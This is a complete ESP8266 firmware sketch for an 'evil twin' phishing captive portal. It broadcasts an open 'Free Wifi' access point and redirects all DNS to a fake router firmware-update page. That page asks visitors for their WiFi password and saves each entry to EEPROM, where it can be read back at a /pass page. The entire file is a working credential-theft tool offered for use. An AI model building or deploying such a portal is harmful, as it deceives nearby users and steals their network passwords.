// Code for ESP8266 Wifi Captive Portal.

// Adding libraries.
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// Default main strings.
#define SUBTITLE "Router info."
#define TITLE "Update"
#define BODY "Your router firmware is out of date. Update your firmware to continue browsing normally."
#define POST_TITLE "Updating..."
#define POST_BODY "Your router is being updated. Please, wait until the proccess finishes.</br>Thank you."
#define PASS_TITLE "Passwords"
#define CLEAR_TITLE "Cleared"

// Initial system settings.
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

// Default wifi SSID name.
const char *SSID_NAME = "Free Wifi";

String allPass = "";     // For storing all passwords.
String newSSID = "";     // For adding new SSID.
String currentSSID = ""; // For storing the SSID in the EEPROM.

// For storing passwords in EEPROM.
int initialCheckLocation = 20; // Location to check whether the ESP is running for the first time.
int passStart = 30;            // Starting location in EEPROM to save password.
int passEnd = passStart;       // Ending location in EEPROM to save password.

unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName)
{
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer()
{
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t)
{
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; text-align:center; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em;  }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 5px; border: 1px solid #555555; color: #000000; }"
               "label { color: #333; display: block; text-align:center; font-style: italic; font-weight: bold; }"
               "nav { background: #fff; color: #64be00; text-align:center; display: block; font-size: 1.3em; padding: 0.8em; }"
               "nav b { display: block; text-align:center; font-size: 1.5em; margin-bottom: 0.1em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" +
             a + " :: " + t + "</title>"
                              "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
                              "<style>" +
             CSS + "</style>"
                   "<meta charset=\"UTF-8\"></head>"
                   "<body><div style=\"text-align:center;\"><img src='data:image/png;base64,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' alt=\"logo\"></div><nav><b>" +
             a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String index()
{
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>WiFi sifre:</label>" +
         "<input type=password name=m></input><input type=submit style=background-color: blue; value=Güncelleme></form>" + footer();
}

String posted()
{
  String pass = input("m");
  pass = "<li><b>" + pass + "</li></b>"; // Adding password in a ordered list.
  allPass += pass;                       // Updating the full passwords.

  // Storing passwords to EEPROM.
  for (int i = 0; i <= pass.length(); ++i)
  {
    EEPROM.write(passEnd + i, pass[i]); // Adding password to existing password in EEPROM.
  }

  passEnd += pass.length(); // Updating end position of passwords in EEPROM.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(POST_TITLE) + POST_BODY + footer();
}

String pass()
{
  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String ssid()
{
  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>" +
         "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
}

String postedSSID()
{
  String postedSSID = input("s");
  newSSID = "<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i)
  {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID);
  return postedSSID;
}

String clear()
{
  allPass = "";
  passEnd = passStart; // Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK()
{
  // The BUILTIN_LED will blink 5 times after a password is posted.
  for (int counter = 0; counter < 10; counter++)
  {
    // For blinking the LED.
    digitalWrite(BUILTIN_LED, counter % 2);
    delay(500);
  }
}

void setup()
{
  // Starting serial communication.
  Serial.begin(115200);

  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Check whether the ESP is running for the first time.
  String checkValue = "first"; // This will will be set in EEPROM after the first run.

  for (int i = 0; i < checkValue.length(); ++i)
  {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');         // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0'); // Clear password location in EEPROM
      EEPROM.commit();
      break;
    }
  }

  // Read SSID in the EEPROM.
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0')
  {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd)); // Reading the store password in EEPROM.
    passEnd++;                             // Updating the end location of password in EEPROM.
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  // Setting currentSSID -> SSID in EEPROM or default one.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("Current SSID: ");
  Serial.print(currentSSID);
  WiFi.softAP(currentSSID);

  // Start webserver
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)
  webServer.on("/post", []() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/ssid", []() { webServer.send(HTTP_CODE, "text/html", ssid()); });
  webServer.on("/postSSID", []() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
  webServer.on("/pass", []() { webServer.send(HTTP_CODE, "text/html", pass()); });
  webServer.on("/clear", []() { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();

  // Enable the BUILTIN_LED.
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop()
{
  if ((millis() - lastTick) > TICK_TIMER)
  {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
